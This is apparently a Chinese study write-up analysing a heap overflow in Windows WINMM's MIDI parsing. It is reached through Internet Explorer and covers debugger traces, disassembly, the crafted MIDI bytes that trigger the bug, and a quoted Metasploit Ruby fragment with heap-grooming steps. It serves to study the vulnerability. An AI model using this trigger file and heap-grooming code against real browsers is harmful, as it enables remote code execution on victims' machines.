    bu WINMM!midiOutPlayNextPolyEvent
    g
ie打开：  
    Breakpoint 1 hit
        eax=00000000 ebx=ffffffff ecx=7ffdf000 edx=0256aa28 esi=0256aa18 edi=0256aa70
        eip=76b2d038 esp=0012e5b0 ebp=0012e5dc iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
        WINMM!midiOutPlayNextPolyEvent:
        76b2d038 8bff            mov     edi,edi
    g
        Breakpoint 1 hit
        eax=00000000 ebx=ffffffff ecx=7ff98000 edx=0256aa28 esi=0256aa18 edi=0256aa70
        eip=76b2d038 esp=0392fea4 ebp=0392fedc iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
        WINMM!midiOutPlayNextPolyEvent:
        76b2d038 8bff            mov     edi,edi
    g
        Breakpoint 0 hit
        eax=00000251 ebx=0000007f ecx=007f2399 edx=00000000 esi=025cae59 edi=0256aa18
        eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl nz na po nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
        WINMM!midiOutPlayNextPolyEvent+0x1ec:
        76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cae59=00
    g
        Breakpoint 0 hit
        eax=00000419 ebx=00000073 ecx=0073b29f edx=00000000 esi=025cb021 edi=0256aa18
        eip=76b2d224 esp=0392fe80 ebp=0392fea0 iopl=0         nv up ei pl zr na pe nc
        cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
        WINMM!midiOutPlayNextPolyEvent+0x1ec:
        76b2d224 8a06            mov     al,byte ptr [esi]          ds:0023:025cb021=00
可以看到-hpa情况下在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处是不会产生访问异常的，结合+hpa的功能(定位导致漏洞的代码或函数)可知在第二次运行WINMM!midiOutPlayNextPolyEvent时第二次运行到+0x1ec处的这句指令将导致产生"堆溢出"。  
    u .
        WINMM!midiOutPlayNextPolyEvent+0x1ec:
        76b2d224 8a06            mov     al,byte ptr [esi]
        76b2d226 8ad0            mov     dl,al
        76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
        76b2d22a 80e2f0          and     dl,0F0h
        76b2d22d 80faf0          cmp     dl,0F0h
        76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
        76b2d232 0410            add     al,10h
        76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
看到的不多，扩大汇编指令范围：  
    u eip-30 eip+30
        WINMM!midiOutPlayNextPolyEvent+0x1bc:
        76b2d1f4 e2f0            loop    WINMM!midiOutPlayNextPolyEvent+0x1ae (76b2d1e6)
        76b2d1f6 80fa90          cmp     dl,90h
        76b2d1f9 8855ff          mov     byte ptr [ebp-1],dl
        76b2d1fc 7405            je      WINMM!midiOutPlayNextPolyEvent+0x1cb (76b2d203)
        76b2d1fe 80fa80          cmp     dl,80h
        76b2d201 755c            jne     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
        76b2d203 0fb6550b        movzx   edx,byte ptr [ebp+0Bh]
        76b2d207 83e00f          and     eax,0Fh
        76b2d20a c1e007          shl     eax,7
        76b2d20d 03c2            add     eax,edx
        76b2d20f 99              cdq
        76b2d210 2bc2            sub     eax,edx
        76b2d212 d1f8            sar     eax,1
        76b2d214 807dff80        cmp     byte ptr [ebp-1],80h
        76b2d218 742a            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
        76b2d21a 84db            test    bl,bl
        76b2d21c 7426            je      WINMM!midiOutPlayNextPolyEvent+0x20c (76b2d244)
        [***]76b2d21e 03f0            add     esi,eax
        76b2d220 f6450b01        test    byte ptr [ebp+0Bh],1
        [==============>eip]76b2d224 8a06            mov     al,byte ptr [esi]
        76b2d226 8ad0            mov     dl,al
        76b2d228 740c            je      WINMM!midiOutPlayNextPolyEvent+0x1fe (76b2d236)
        76b2d22a 80e2f0          and     dl,0F0h
        76b2d22d 80faf0          cmp     dl,0F0h
        76b2d230 742d            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
        76b2d232 0410            add     al,10h
        76b2d234 eb0a            jmp     WINMM!midiOutPlayNextPolyEvent+0x208 (76b2d240)
        76b2d236 80e20f          and     dl,0Fh
        76b2d239 80fa0f          cmp     dl,0Fh
        76b2d23c 7421            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
        [***]76b2d23e fec0            inc     al
        [***]76b2d240 8806            mov     byte ptr [esi],al
        76b2d242 eb1b            jmp     WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
        76b2d244 f6450b01        test    byte ptr [ebp+0Bh],1
        76b2d248 8d1430          lea     edx,[eax+esi]
        76b2d24b 8a02            mov     al,byte ptr [edx]
        76b2d24d 7408            je      WINMM!midiOutPlayNextPolyEvent+0x21f (76b2d257)
        76b2d24f a8f0            test    al,0F0h
        76b2d251 740c            je      WINMM!midiOutPlayNextPolyEvent+0x227 (76b2d25f)
        76b2d253 2c10            sub     al,10h
在当前eip处eax=0x419，而eip最近执行过的与eax相关的指令为76b2d21e处的add
esi,eax，书中分析的是此处的esi来源于winmmAlloc(0x400)分配到的内存地址，而add
esi,eax中的eax=0x419超过了分配的0x400导致访问到超出0x19大小处的内容
，在eip下面的76b2d23e和76b2d240处可以看到，[esi]的值会加1，也即在超出0x19大小处的内存中的内容会加1，这就是这个漏洞的危害：导致内存某处的值+1，只要能够控制这个0x19处的内存的内容，就有机会利用这个漏洞。
上面之所以会有76b2d240处的导致[esi]加1的出现，是要在mid文件中的某个音轨事件处写上"打开音符"对应的值(书中是0x0073b29f)，如下||之间的内容：  
     00000000: 4d54 6864 0000 0006 0000 0001 0060 4d54  MThd.........`MT
        00000010: 726b 0000 0035 00ff 030d 4472 756d 7320  rk...5....Drums 
        00000020: 2020 2842 4229 0000 c928 00b9 0764 00b9    (BB)...(...d..
        00000030: 0a40 00b9 7b00 00b9 5b28 00b9 5d00 8550  .@..{...[(..]..P
        00000040: 9923 7f00|9fb2 7300|ff2f 000a            .#....s../..
满足mid文件中对应位置处的值为"打开音符"后，会导致在当前eip环境下的[esi]加1，也即76b2d21e执行后的[esi]加1，也即winAlloc(0x400)分配到的内存地址+0x19处的内容加1，而利用方式中正好是利用相应内存中的值加1导致任意代码执行。书中通过ida的f5分析函数调用与参数传递分析得到上面的esi的源是winmmAlloc(0x400)，也即在打开mid文件后会有一个这样的内存分配动作，于是构造出如下结构的内存空间使得winmmAlloc(0x400)分到的内存地址相对可控：  
|xxxxxxxx|oooooooo|xxxxxxxxx|ooooooooo|xxxxxxxxx|ooooooooo|…  
也即在mid文件被ie解析之前，先用js构造上面这样的内存格式，其中xxx表示有数据，ooo表示空闲内存，每个||之间的内存大小正好为0x400，这样在上面内存结构的基础上再由ie解析mid文件而产生winmmAlloc(0x400)的动作就会分配到上面的ooo的某个位置上，然后由于mid文件是特殊的构造好的会使winmmAlloc(0x400)分到的内存地址+0x19处的内存的内容加1的文件，于是ie解析mid文件后，将导致winmmAlloc(0x400)分到的某个ooo位置的右边一个xxx的位置上的偏移0x19中的值加1，当上面构造的特殊内存格式时构造好该位置内容的值+1会使得代码执行时，就可以利用这个漏洞了，而书中(msf)的利用方式是用下面的js来达到目的的：
    [msf中的构造特殊内存结构的由ruby写的js]
        def build_element(element_name, my_target, type="corruption")
          dst = Rex::Text.to_unescape([my_target['DispatchDst']].pack("V"))
          element = ''
          if my_target.name =~ /IE 8/
            max   = 63   # Number of attributes for IE 8
            index = 1    # Where we want to confuse the type
          else
            max   = 55   # Number of attributes for before IE 8
            index = 0    # Where we want to confuse the type
          end
          element << "var #{element_name} = document.createElement("select")" + "n"
          # Build attributes
          0.upto(max) do |i|
            case type
              when "corruption"
                obj = (i==index) ? "unescape("#{dst}")" : ""
              else #leak
                obj = ""
            end
            element << "#{element_name}.w#{i.to_s} = #{obj}" + "n"
          end
          return element
        end
        # Feng Shui and triggering Steps:
        # 1. Run the garbage collector before allocations
        # 2. Defragment the heap and alloc CImplAry objects in one step (objects size are IE version dependent)
        # 3. Make holes
        # 4. Let windows media play the crafted midi file and corrupt the heap